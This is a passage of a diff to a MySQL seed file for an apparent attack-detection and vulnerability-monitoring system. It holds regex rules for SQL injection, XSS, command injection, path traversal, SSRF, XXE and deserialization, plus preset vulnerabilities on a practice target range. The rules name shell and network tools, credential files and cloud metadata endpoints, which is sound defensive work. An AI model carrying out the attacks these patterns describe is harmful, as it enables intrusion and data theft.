@@ -621,6 +621,17 @@ CREATE TABLE `sys_scan_interface` (
     `defense_rule_status` TINYINT DEFAULT 0 COMMENT '防御规则状态(0-未配置，1-部分已配置，2-已配置)',
     `defense_rule_count` INT DEFAULT 0 COMMENT '关联防御规则数量',
     `defense_rule_note` VARCHAR(500) DEFAULT NULL COMMENT '防御规则说明',
+    `business_type` VARCHAR(50) DEFAULT NULL COMMENT '业务功能类型(USER_INPUT,DATA_QUERY,DATA_SUBMIT,FILE_OPERATION,FILE_UPLOAD,URL_FETCH,COMMAND_EXEC,AUTH_RELATED,XML_PROCESS,CONFIG_ACCESS,API_PROXY)',
+    `input_params` TEXT DEFAULT NULL COMMENT '输入参数描述(JSON数组)',
+    `output_type` VARCHAR(50) DEFAULT 'JSON' COMMENT '输出类型(JSON,HTML,XML,FILE,BINARY)',
+    `auth_required` TINYINT DEFAULT 0 COMMENT '是否需要认证(0-否,1-是)',
+    `content_type` VARCHAR(100) DEFAULT 'application/json' COMMENT '请求内容类型',
+    `external_request` TINYINT DEFAULT 0 COMMENT '是否发起外部请求(0-否,1-是)',
+    `file_operation` TINYINT DEFAULT 0 COMMENT '是否涉及文件操作(0-否,1-是)',
+    `db_operation` TINYINT DEFAULT 0 COMMENT '是否涉及数据库操作(0-否,1-是)',
+    `inferred_vuln_types` VARCHAR(500) DEFAULT NULL COMMENT '推断的漏洞类型(JSON数组)',
+    `scan_status` VARCHAR(20) DEFAULT 'PENDING' COMMENT '扫描状态(PENDING,SCANNING,COMPLETED,FAILED)',
+    `last_scan_time` DATETIME DEFAULT NULL COMMENT '最后扫描时间',
     `create_time` DATETIME DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
     `update_time` DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
     PRIMARY KEY (`id`),
@@ -708,87 +719,95 @@ CREATE TABLE `sys_scan_history` (
 -- 4.1 初始化攻击检测规则
 -- ------------------------------------------------------------
 
--- SQL 注入检测规则（针对靶场测试用例优化）
+-- 2.1 SQL注入检测规则
 INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
-('SQL 注入检测 - UNION 关键字', 'SQL_INJECTION', '(?i)\\bUNION\\b.*\\bSELECT\\b', '检测 UNION SELECT 注入攻击', 'HIGH', 1, 10),
-('SQL 注入检测 - OR 1=1', 'SQL_INJECTION', '(?i)\\bOR\\b\\s+[\'"]?1[\'"]?\\s*=\\s*[\'"]?1[\'"]?', '检测 OR 1=1 注入攻击', 'HIGH', 1, 10),
-('SQL 注入检测 - DROP TABLE', 'SQL_INJECTION', '(?i)\\bDROP\\b.*\\bTABLE\\b', '检测 DROP TABLE 恶意注入', 'HIGH', 1, 5),
-('SQL 注入检测 - SLEEP 函数', 'SQL_INJECTION', '(?i)\\bSLEEP\\b\\s*\\(', '检测基于时间盲注的 SLEEP 函数', 'MEDIUM', 1, 20),
-('SQL 注入检测 - BENCHMARK 函数', 'SQL_INJECTION', '(?i)\\bBENCHMARK\\b\\s*\\(', '检测基于时间盲注的 BENCHMARK 函数', 'MEDIUM', 1, 20),
-('SQL 注入检测 - 注释符号', 'SQL_INJECTION', '(--|#|/\\*)', '检测 SQL 注释符号', 'LOW', 1, 50),
-('SQL 注入检测 - 十六进制编码', 'SQL_INJECTION', '0x[0-9a-fA-F]+', '检测十六进制编码的注入', 'MEDIUM', 1, 30),
-('SQL 注入检测 - 堆叠查询', 'SQL_INJECTION', ';\\s*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\\b', '检测堆叠查询攻击', 'HIGH', 1, 15),
-('SQL 注入检测 - 布尔盲注', 'SQL_INJECTION', '(?i)\\bAND\\b\\s+[\'"]?\\d+[\'"]?\\s*=\\s*[\'"]?\\d+[\'"]?', '检测布尔盲注攻击', 'MEDIUM', 1, 25);
+('SQL注入-UNION查询', 'SQL_INJECTION', '(?i)\\bUNION\\b.*\\bSELECT\\b', '检测UNION SELECT联合查询注入', 'HIGH', 1, 10),
+('SQL注入-OR恒真', 'SQL_INJECTION', '(?i)\\bOR\\b\\s+[\'"]?1[\'"]?\\s*=\\s*[\'"]?1[\'"]?', '检测OR 1=1恒真注入', 'HIGH', 1, 10),
+('SQL注入-AND恒真', 'SQL_INJECTION', '(?i)\\bAND\\b\\s+[\'"]?\\d+[\'"]?\\s*=\\s*[\'"]?\\d+[\'"]?', '检测AND布尔盲注', 'MEDIUM', 1, 15),
+('SQL注入-DROP语句', 'SQL_INJECTION', '(?i)\\bDROP\\b.*\\bTABLE\\b', '检测DROP TABLE恶意注入', 'CRITICAL', 1, 5),
+('SQL注入-SLEEP延时', 'SQL_INJECTION', '(?i)\\bSLEEP\\b\\s*\\(', '检测SLEEP时间盲注', 'MEDIUM', 1, 20),
+('SQL注入-BENCHMARK延时', 'SQL_INJECTION', '(?i)\\bBENCHMARK\\b\\s*\\(', '检测BENCHMARK时间盲注', 'MEDIUM', 1, 20),
+('SQL注入-注释符号', 'SQL_INJECTION', '(--|#|/\\*)', '检测SQL注释符号', 'LOW', 1, 50),
+('SQL注入-堆叠查询', 'SQL_INJECTION', ';\\s*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\\b', '检测堆叠查询攻击', 'HIGH', 1, 15),
+('SQL注入-单引号闭合', 'SQL_INJECTION', '\'', '检测单引号注入尝试', 'LOW', 1, 100);
 
--- XSS 攻击检测规则（针对靶场测试用例优化）
+-- 2.2 XSS攻击检测规则
 INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
-('XSS 检测 - script 标签', 'XSS', '(?i)<\\s*script[^>]*>', '检测 script 标签注入', 'HIGH', 1, 10),
-('XSS 检测 - javascript 协议', 'XSS', '(?i)javascript\\s*:', '检测 javascript 协议注入', 'HIGH', 1, 10),
-('XSS 检测 - onerror 事件', 'XSS', '(?i)\\bonerror\\b\\s*=', '检测 onerror 事件处理器', 'MEDIUM', 1, 20),
-('XSS 检测 - onload 事件', 'XSS', '(?i)\\bonload\\b\\s*=', '检测 onload 事件处理器', 'MEDIUM', 1, 20),
-('XSS 检测 - onclick 事件', 'XSS', '(?i)\\bonclick\\b\\s*=', '检测 onclick 事件处理器', 'MEDIUM', 1, 20),
-('XSS 检测 - alert 函数', 'XSS', '(?i)\\balert\\b\\s*\\(', '检测 alert 弹窗函数', 'MEDIUM', 1, 30),
-('XSS 检测 - document.cookie', 'XSS', '(?i)document\\.cookie', '检测 Cookie 窃取尝试', 'HIGH', 1, 15),
-('XSS 检测 - img 标签注入', 'XSS', '(?i)<\\s*img[^>]+onerror', '检测 img 标签 onerror 注入', 'MEDIUM', 1, 25),
-('XSS 检测 - SVG 标签注入', 'XSS', '(?i)<\\s*svg[^>]*onload', '检测 SVG 标签 onload 注入', 'MEDIUM', 1, 25),
-('XSS 检测 - eval 函数', 'XSS', '(?i)\\beval\\b\\s*\\(', '检测 eval 函数调用', 'HIGH', 1, 20);
+('XSS-script标签', 'XSS', '(?i)<\\s*script[^>]*>', '检测script标签注入', 'HIGH', 1, 10),
+('XSS-javascript协议', 'XSS', '(?i)javascript\\s*:', '检测javascript协议注入', 'HIGH', 1, 10),
+('XSS-onerror事件', 'XSS', '(?i)\\bonerror\\b\\s*=', '检测onerror事件处理器', 'MEDIUM', 1, 20),
+('XSS-onload事件', 'XSS', '(?i)\\bonload\\b\\s*=', '检测onload事件处理器', 'MEDIUM', 1, 20),
+('XSS-onclick事件', 'XSS', '(?i)\\bonclick\\b\\s*=', '检测onclick事件处理器', 'MEDIUM', 1, 20),
+('XSS-alert函数', 'XSS', '(?i)\\balert\\b\\s*\\(', '检测alert弹窗函数', 'MEDIUM', 1, 30),
+('XSS-document对象', 'XSS', '(?i)document\\.(cookie|location|write)', '检测document对象访问', 'HIGH', 1, 15),
+('XSS-img标签注入', 'XSS', '(?i)<\\s*img[^>]+onerror', '检测img标签onerror注入', 'MEDIUM', 1, 25),
+('XSS-SVG标签注入', 'XSS', '(?i)<\\s*svg[^>]*onload', '检测SVG标签onload注入', 'MEDIUM', 1, 25),
+('XSS-eval函数', 'XSS', '(?i)\\beval\\b\\s*\\(', '检测eval函数调用', 'HIGH', 1, 20),
+('XSS-iframe标签', 'XSS', '(?i)<\\s*iframe', '检测iframe标签注入', 'MEDIUM', 1, 30);
 
--- 命令注入检测规则（针对靶场测试用例优化，减少误报）
+-- 2.3 命令注入检测规则
 INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
-('命令注入 - 管道符', 'COMMAND_INJECTION', '\\|\\s*(cat|ls|pwd|whoami|wget|curl|nc|bash|sh|cmd|type|dir|find|ping|tasklist)\\b', '检测管道符命令注入', 'HIGH', 1, 10),
-('命令注入 - 分号分隔', 'COMMAND_INJECTION', ';\\s*(cat|ls|pwd|whoami|wget|curl|nc|bash|sh|cmd|type|dir|find|ping|tasklist)\\b', '检测分号分隔的命令注入', 'HIGH', 1, 10),
-('命令注入 - 反引号执行', 'COMMAND_INJECTION', '`[^`]+`', '检测反引号命令执行', 'HIGH', 1, 5),
-('命令注入 - $() 执行', 'COMMAND_INJECTION', '\\$\\([^)]+\\)', '检测 $() 命令执行', 'HIGH', 1, 5),
-('命令注入 - 常见命令带参数', 'COMMAND_INJECTION', '(?i)\\b(cat|ls|pwd|whoami|wget|curl|nc|bash|sh|ping|tasklist)\\s+[\\w\\-./]+', '检测常见系统命令带参数', 'MEDIUM', 1, 30),
-('命令注入 - Windows 命令执行', 'COMMAND_INJECTION', '(?i)(cmd\\s*/c|cmd\\.exe|powershell\\s*-|\\|\\s*cmd\\b)', '检测 Windows 命令执行模式', 'HIGH', 1, 25),
-('命令注入 - 参数注入', 'COMMAND_INJECTION', '(?i)(cmd|command|exec|execute)\\s*=\\s*(ping|cat|ls|whoami|wget|curl|nc|bash|sh|cmd|type|dir|find|tasklist)\\b', '检测参数中的命令注入（参数名=命令）', 'HIGH', 1, 20),
-('命令注入 - ping命令注入', 'COMMAND_INJECTION', '(?i)(cmd|command|exec|execute)\\s*=\\s*ping\\s+\\d+\\.\\d+\\.\\d+\\.\\d+', '检测ping命令注入攻击', 'HIGH', 1, 15);
+('命令注入-管道符', 'COMMAND_INJECTION', '\\|\\s*(cat|ls|pwd|whoami|wget|curl|nc|bash|sh|cmd|type|dir|find|ping|tasklist|id)\\b', '检测管道符命令注入', 'HIGH', 1, 10),
+('命令注入-分号', 'COMMAND_INJECTION', ';\\s*(cat|ls|pwd|whoami|wget|curl|nc|bash|sh|cmd|type|dir|find|ping|tasklist|id)\\b', '检测分号命令注入', 'HIGH', 1, 10),
+('命令注入-反引号', 'COMMAND_INJECTION', '`[^`]+`', '检测反引号命令执行', 'HIGH', 1, 5),
+('命令注入-$()执行', 'COMMAND_INJECTION', '\\$\\([^)]+\\)', '检测$()命令执行', 'HIGH', 1, 5),
+('命令注入-Windows cmd', 'COMMAND_INJECTION', '(?i)(cmd\\s*/c|cmd\\.exe|powershell\\s*-)', '检测Windows命令执行', 'HIGH', 1, 15),
+('命令注入-ping命令', 'COMMAND_INJECTION', '(?i)ping\\s+\\d+\\.\\d+\\.\\d+\\.\\d+', '检测ping命令注入', 'MEDIUM', 1, 25),
+('命令注入-whoami', 'COMMAND_INJECTION', '(?i)\\bwhoami\\b', '检测whoami命令', 'HIGH', 1, 20),
+('命令注入-tasklist', 'COMMAND_INJECTION', '(?i)\\btasklist\\b', '检测tasklist命令', 'MEDIUM', 1, 30),
+('命令注入-cat命令', 'COMMAND_INJECTION', '(?i)\\bcat\\s+[/\\w\\-\\.]+', '检测cat文件读取', 'HIGH', 1, 20);
 
--- 路径遍历检测规则（针对靶场测试用例优化）
+-- 2.4 路径遍历检测规则
 INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
-('路径遍历 - 父目录引用', 'PATH_TRAVERSAL', '\\.\\./|\\.\\.\\\\', '检测父目录引用 (../ 或 ..\\)', 'HIGH', 1, 10),
-('路径遍历 - 绝对路径', 'PATH_TRAVERSAL', '(?i)/etc/passwd|/etc/shadow', '检测 Linux 敏感文件路径', 'HIGH', 1, 5),
-('路径遍历 - Windows 敏感文件', 'PATH_TRAVERSAL', '(?i)c:\\\\windows', '检测 Windows 系统路径', 'MEDIUM', 1, 20),
-('路径遍历 - URL 编码绕过', 'PATH_TRAVERSAL', '%2e%2e%2f|%2e%2e/', '检测 URL 编码的路径遍历', 'HIGH', 1, 15),
-('路径遍历 - 参数注入', 'PATH_TRAVERSAL', '(?i)(filename|file|path)\\s*=[^&]*\\.\\./', '检测参数中的路径遍历', 'HIGH', 1, 12);
+('路径遍历-父目录引用', 'PATH_TRAVERSAL', '\\.\\./|\\.\\.\\\\', '检测../父目录引用', 'HIGH', 1, 10),
+('路径遍历-Linux敏感文件', 'PATH_TRAVERSAL', '(?i)/etc/(passwd|shadow|hosts)', '检测Linux敏感文件路径', 'CRITICAL', 1, 5),
+('路径遍历-Windows敏感路径', 'PATH_TRAVERSAL', '(?i)(c:|d:|e:)\\\\(windows|users|program)', '检测Windows系统路径', 'HIGH', 1, 15),
+('路径遍历-URL编码绕过', 'PATH_TRAVERSAL', '%2e%2e%2f|%2e%2e/', '检测URL编码绕过', 'HIGH', 1, 15),
+('路径遍历-双重编码', 'PATH_TRAVERSAL', '%252e%252e', '检测双重URL编码', 'HIGH', 1, 12),
+('路径遍历-配置文件', 'PATH_TRAVERSAL', '(?i)(application|config|database)\\.(yml|yaml|properties|xml)', '检测配置文件访问', 'HIGH', 1, 10);
 
--- 文件包含检测规则（针对靶场测试用例优化）
+-- 2.5 文件包含检测规则
 INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
-('文件包含 - PHP include', 'FILE_INCLUSION', '(?i)\\b(include|require|include_once|require_once)\\b\\s*\\(', '检测 PHP 文件包含函数', 'HIGH', 1, 10),
-('文件包含 - data 协议', 'FILE_INCLUSION', '(?i)data://', '检测 data 协议文件包含', 'HIGH', 1, 10),
-('文件包含 - php://协议', 'FILE_INCLUSION', '(?i)php://', '检测 php:// 协议', 'HIGH', 1, 10),
-('文件包含 - file://协议', 'FILE_INCLUSION', '(?i)file://', '检测 file:// 协议', 'HIGH', 1, 10),
-('文件包含 - classpath 协议', 'FILE_INCLUSION', '(?i)classpath:', '检测 classpath 协议文件包含', 'HIGH', 1, 10),
-('文件包含 - 参数注入', 'FILE_INCLUSION', '(?i)(path|file|include)\\s*=[^&]*(file://|classpath:|\\.\\./)', '检测参数中的文件包含', 'HIGH', 1, 15);
+('文件包含-PHP函数', 'FILE_INCLUSION', '(?i)\\b(include|require|include_once|require_once)\\b\\s*\\(', '检测PHP文件包含函数', 'HIGH', 1, 10),
+('文件包含-data协议', 'FILE_INCLUSION', '(?i)data://', '检测data协议', 'HIGH', 1, 10),
+('文件包含-php协议', 'FILE_INCLUSION', '(?i)php://', '检测php://协议', 'HIGH', 1, 10),
+('文件包含-file协议', 'FILE_INCLUSION', '(?i)file://', '检测file://协议', 'HIGH', 1, 10),
+('文件包含-classpath', 'FILE_INCLUSION', '(?i)classpath:', '检测classpath协议', 'HIGH', 1, 10);
 
--- DDoS 攻击检测规则（基于频率）
+-- 2.6 SSRF检测规则
 INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
-('DDoS 检测 - 高频请求', 'DDOS', 'FREQUENCY_THRESHOLD', '基于请求频率的 DDoS 检测（需配合计数器）', 'HIGH', 1, 1);
+('SSRF-内网IP', 'SSRF', '(?i)(url|uri|target|host|domain|site|link|src|source)\\s*[=:]\\s*["\']?https?://(127\\.0\\.0\\.1|localhost|192\\.168\\.|10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.)', '检测内网IP请求', 'HIGH', 1, 10),
+('SSRF-file协议', 'SSRF', '(?i)(url|uri|target|host|domain)\\s*[=:]\\s*["\']?file://', '检测file协议SSRF', 'HIGH', 1, 8),
+('SSRF-dict协议', 'SSRF', '(?i)(url|uri|target|host)\\s*[=:]\\s*["\']?dict://', '检测dict协议SSRF', 'HIGH', 1, 8),
+('SSRF-gopher协议', 'SSRF', '(?i)(url|uri|target|host)\\s*[=:]\\s*["\']?gopher://', '检测gopher协议SSRF', 'HIGH', 1, 8),
+('SSRF-云元数据', 'SSRF', '(?i)(url|uri|target|host)\\s*[=:]\\s*["\']?https?://(169\\.254\\.169\\.254|metadata\\.azure|metadata\\.google)', '检测云元数据SSRF', 'HIGH', 1, 5),
+('SSRF-本地回环', 'SSRF', '(?i)url\\s*=\\s*["\']?https?://(127\\.0\\.0\\.1|localhost)', '检测本地回环SSRF', 'HIGH', 1, 10);
 
--- XXE 攻击检测规则
+-- 2.7 XXE检测规则
 INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
-('XXE 检测 - DOCTYPE ENTITY', 'XXE', '(?i)<!DOCTYPE[^>]*\\bENTITY\\b', '检测 DOCTYPE ENTITY 声明', 'HIGH', 1, 5),
-('XXE 检测 - SYSTEM 关键字', 'XXE', '(?i)\\bSYSTEM\\s*["\']', '检测 SYSTEM 关键字引用外部实体', 'HIGH', 1, 5),
-('XXE 检测 - PUBLIC 关键字', 'XXE', '(?i)\\bPUBLIC\\s*["\']', '检测 PUBLIC 关键字引用外部实体', 'HIGH', 1, 5),
-('XXE 检测 - file:// 协议', 'XXE', '(?i)file://', '检测 file:// 协议外部实体引用', 'HIGH', 1, 8),
-('XXE 检测 - http:// 协议', 'XXE', '(?i)\\bSYSTEM\\s*["\']?https?://', '检测 http/https 协议外部实体引用', 'HIGH', 1, 8),
-('XXE 检测 - 参数实体', 'XXE', '(?i)<!ENTITY\\s+%', '检测参数实体声明', 'HIGH', 1, 10),
-('XXE 检测 - 外部通用实体', 'XXE', '(?i)<!ENTITY\\s+\\w+\\s+SYSTEM', '检测外部通用实体声明', 'HIGH', 1, 5);
+('XXE-DOCTYPE ENTITY', 'XXE', '(?i)<!DOCTYPE[^>]*\\bENTITY\\b', '检测DOCTYPE ENTITY声明', 'HIGH', 1, 5),
+('XXE-SYSTEM关键字', 'XXE', '(?i)\\bSYSTEM\\s*["\']', '检测SYSTEM关键字', 'HIGH', 1, 5),
+('XXE-PUBLIC关键字', 'XXE', '(?i)\\bPUBLIC\\s*["\']', '检测PUBLIC关键字', 'HIGH', 1, 5),
+('XXE-file协议', 'XXE', '(?i)SYSTEM\\s*["\']?file://', '检测file协议外部实体', 'HIGH', 1, 8),
+('XXE-http协议', 'XXE', '(?i)SYSTEM\\s*["\']?https?://', '检测http协议外部实体', 'HIGH', 1, 8),
+('XXE-参数实体', 'XXE', '(?i)<!ENTITY\\s+%', '检测参数实体声明', 'HIGH', 1, 10);
 
--- SSRF 攻击检测规则
+-- 2.8 反序列化检测规则
 INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
-('SSRF 检测 - 内网IP', 'SSRF', '(?i)(url|uri|target|host|domain|site|link|src|source)\\s*[=:]\\s*["\']?https?://(127\\.0\\.0\\.1|localhost|192\\.168\\.|10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.)', '检测内网IP地址请求', 'HIGH', 1, 10),
-('SSRF 检测 - file:// 协议', 'SSRF', '(?i)(url|uri|target|host|domain)\\s*[=:]\\s*["\']?file://', '检测 file:// 协议SSRF', 'HIGH', 1, 8),
-('SSRF 检测 - dict:// 协议', 'SSRF', '(?i)(url|uri|target|host)\\s*[=:]\\s*["\']?dict://', '检测 dict:// 协议SSRF', 'HIGH', 1, 8),
-('SSRF 检测 - gopher:// 协议', 'SSRF', '(?i)(url|uri|target|host)\\s*[=:]\\s*["\']?gopher://', '检测 gopher:// 协议SSRF', 'HIGH', 1, 8),
-('SSRF 检测 - 云元数据', 'SSRF', '(?i)(url|uri|target|host)\\s*[=:]\\s*["\']?https?://(169\\.254\\.169\\.254|metadata\\.azure|metadata\\.google)', '检测云元数据SSRF', 'HIGH', 1, 5);
+('反序列化-Java头', 'DESERIALIZATION', '\\xac\\xed\\x00\\x05', '检测Java序列化对象头', 'HIGH', 1, 5),
+('反序列化-PHP序列化', 'DESERIALIZATION', '(?i)(O:\\d+:|a:\\d+:|s:\\d+:)', '检测PHP序列化字符串', 'HIGH', 1, 10),
+('反序列化-Python pickle', 'DESERIALIZATION', '(?i)(c__builtin__|c__main__|cos\\n|csubprocess)', '检测Python pickle序列化', 'HIGH', 1, 10),
+('反序列化-Base64 Java', 'DESERIALIZATION', '(?i)rO0AB', '检测Base64编码Java序列化', 'HIGH', 1, 8);
 
--- 反序列化攻击检测规则
+-- 2.9 CSRF检测规则
 INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
-('反序列化 - Java序列化头', 'DESERIALIZATION', '\\xac\\xed\\x00\\x05', '检测Java序列化对象头', 'HIGH', 1, 5),
-('反序列化 - PHP序列化', 'DESERIALIZATION', '(?i)(O:\\d+:|a:\\d+:|s:\\d+:)', '检测PHP序列化字符串', 'HIGH', 1, 10),
-('反序列化 - Python pickle', 'DESERIALIZATION', '(?i)(c__builtin__|c__main__|cos\\n|csubprocess)', '检测Python pickle序列化', 'HIGH', 1, 10),
-('反序列化 - base64编码Java', 'DESERIALIZATION', '(?i)rO0AB', '检测base64编码的Java序列化对象', 'HIGH', 1, 8);
+('CSRF-表单自动提交', 'CSRF', '(?i)<\\s*form[^>]+action\\s*=\\s*["\']?https?://[^"\'>\\s]+', '检测自动提交表单', 'MEDIUM', 1, 20),
+('CSRF-隐藏字段', 'CSRF', '(?i)<\\s*input[^>]+type\\s*=\\s*["\']?hidden', '检测隐藏表单字段', 'LOW', 1, 30),
+('CSRF-跨域请求', 'CSRF', '(?i)<\\s*img[^>]+src\\s*=\\s*["\']?https?://[^"\'>\\s]+', '检测跨域图片请求', 'LOW', 1, 40);
+
+-- 2.10 DDoS检测规则（基于频率）
+INSERT INTO `sys_monitor_rule` (`rule_name`, `attack_type`, `rule_content`, `description`, `risk_level`, `enabled`, `priority`) VALUES
+('DDoS-高频请求', 'DDOS', 'FREQUENCY_THRESHOLD', '基于请求频率的DDoS检测', 'HIGH', 1, 1);
 
 -- ------------------------------------------------------------
 -- 4.1.2 初始化检测白名单
@@ -837,137 +856,412 @@ INSERT INTO `sys_detection_whitelist` (`whitelist_type`, `whitelist_value`, `des
 ('HEADER', 'X-Forwarded-For', '代理转发请求头', 1, 130),
 ('HEADER', 'X-Real-IP', '真实IP请求头', 1, 140),
 ('HEADER', 'X-Request-ID', '请求ID请求头', 1, 150),
-('HEADER', 'X-Forwarded-Proto', '转发协议请求头', 1, 160);
+('HEADER', 'X-Forwarded-Proto', '转发协议请求头', 1, 160),
+('HEADER', 'X-Scan-Traffic', '扫描流量标识请求头', 1, 5),
+('HEADER', 'X-Scan-Source', '扫描来源标识请求头', 1, 6);
 
 -- ------------------------------------------------------------
--- 4.2 初始化预设漏洞信息
+-- 4.2 初始化预设漏洞信息（细粒度：每个规则对应一个漏洞）
 -- ------------------------------------------------------------
-INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `description`, `fix_suggestion`) VALUES
-('SQL 注入漏洞 - 登录绕过', 'SQL_INJECTION', 'HIGH', '/api/login', 0, 
- '用户登录接口存在 SQL 注入漏洞，攻击者可通过注入恶意 SQL 语句绕过身份验证',
- '使用参数化查询或预编译语句，避免直接拼接 SQL 语句；对用户输入进行严格的验证和过滤'),
+-- SQL注入漏洞（9个漏洞，对应规则ID 1-9）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('SQL注入-UNION查询攻击', 'SQL_INJECTION', 'HIGH', '/target/sql/query', 0, '1', 1, 2, 
+ '用户查询接口存在SQL注入漏洞，攻击者可使用UNION SELECT语句获取数据库敏感信息',
+ '使用参数化查询或预编译语句，对用户输入进行严格验证'),
+('SQL注入-OR恒真攻击', 'SQL_INJECTION', 'HIGH', '/target/sql/query', 0, '2', 1, 2,
+ '用户查询接口存在SQL注入漏洞，攻击者可使用OR 1=1恒真条件绕过认证',
+ '使用参数化查询或预编译语句，对用户输入进行严格验证'),
+('SQL注入-AND布尔盲注', 'SQL_INJECTION', 'MEDIUM', '/target/sql/query', 0, '3', 1, 2,
+ '用户查询接口存在SQL注入漏洞，攻击者可使用AND布尔条件进行盲注攻击',
+ '使用参数化查询或预编译语句，对用户输入进行严格验证'),
+('SQL注入-DROP语句攻击', 'SQL_INJECTION', 'CRITICAL', '/target/sql/query', 0, '4', 1, 2,
+ '用户查询接口存在SQL注入漏洞，攻击者可执行DROP TABLE等危险操作',
+ '使用参数化查询或预编译语句，对用户输入进行严格验证'),
+('SQL注入-SLEEP延时盲注', 'SQL_INJECTION', 'MEDIUM', '/target/sql/query', 0, '5', 1, 2,
+ '用户查询接口存在SQL注入漏洞，攻击者可使用SLEEP函数进行时间盲注',
+ '使用参数化查询或预编译语句，对用户输入进行严格验证'),
+('SQL注入-BENCHMARK延时攻击', 'SQL_INJECTION', 'MEDIUM', '/target/sql/query', 0, '6', 1, 2,
+ '用户查询接口存在SQL注入漏洞，攻击者可使用BENCHMARK函数进行时间盲注',
+ '使用参数化查询或预编译语句，对用户输入进行严格验证'),
+('SQL注入-注释符号绕过', 'SQL_INJECTION', 'LOW', '/target/sql/query', 0, '7', 1, 2,
+ '用户查询接口存在SQL注入漏洞，攻击者可使用注释符号绕过SQL语句限制',
+ '使用参数化查询或预编译语句，对用户输入进行严格验证'),
+('SQL注入-堆叠查询攻击', 'SQL_INJECTION', 'HIGH', '/target/sql/query', 0, '8', 1, 2,
+ '用户查询接口存在SQL注入漏洞，攻击者可执行多条SQL语句（堆叠查询）',
+ '使用参数化查询或预编译语句，对用户输入进行严格验证'),
+('SQL注入-单引号闭合攻击', 'SQL_INJECTION', 'LOW', '/target/sql/query', 0, '9', 1, 2,
+ '用户查询接口存在SQL注入漏洞，攻击者可使用单引号闭合SQL语句',
+ '使用参数化查询或预编译语句，对用户输入进行严格验证');
 
-('XSS 漏洞 - 搜索框反射', 'XSS', 'MEDIUM', '/api/search', 0, 
- '搜索功能存在反射型 XSS 漏洞，用户输入未正确转义直接输出到页面',
- '对用户输入进行 HTML 实体转义；设置 Content-Type 响应头；使用 CSP 策略'),
+-- XSS存储型漏洞（11个漏洞，对应规则ID 10-20）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('XSS存储型-script标签注入', 'XSS', 'HIGH', '/target/xss/submit-comment', 0, '10', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可注入script标签执行恶意脚本',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-javascript协议注入', 'XSS', 'HIGH', '/target/xss/submit-comment', 0, '11', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可使用javascript:协议执行代码',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-onerror事件注入', 'XSS', 'MEDIUM', '/target/xss/submit-comment', 0, '12', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可使用onerror事件执行脚本',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-onload事件注入', 'XSS', 'MEDIUM', '/target/xss/submit-comment', 0, '13', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可使用onload事件执行脚本',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-onclick事件注入', 'XSS', 'MEDIUM', '/target/xss/submit-comment', 0, '14', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可使用onclick事件执行脚本',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-alert函数注入', 'XSS', 'MEDIUM', '/target/xss/submit-comment', 0, '15', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可注入alert函数测试漏洞',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-document对象注入', 'XSS', 'HIGH', '/target/xss/submit-comment', 0, '16', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可访问document对象窃取信息',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-img标签注入', 'XSS', 'MEDIUM', '/target/xss/submit-comment', 0, '17', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可注入img标签执行脚本',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-SVG标签注入', 'XSS', 'MEDIUM', '/target/xss/submit-comment', 0, '18', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可注入SVG标签执行脚本',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-eval函数注入', 'XSS', 'HIGH', '/target/xss/submit-comment', 0, '19', 1, 2,
+ '评论提交接口存在存储型XSS漏洞，攻击者可使用eval函数执行任意代码',
+ '对用户输入进行HTML实体转义，设置CSP策略'),
+('XSS存储型-iframe标签注入', 'XSS', 'MEDIUM', '/target/xss/submit-comment', 0, '20', 1, 2,
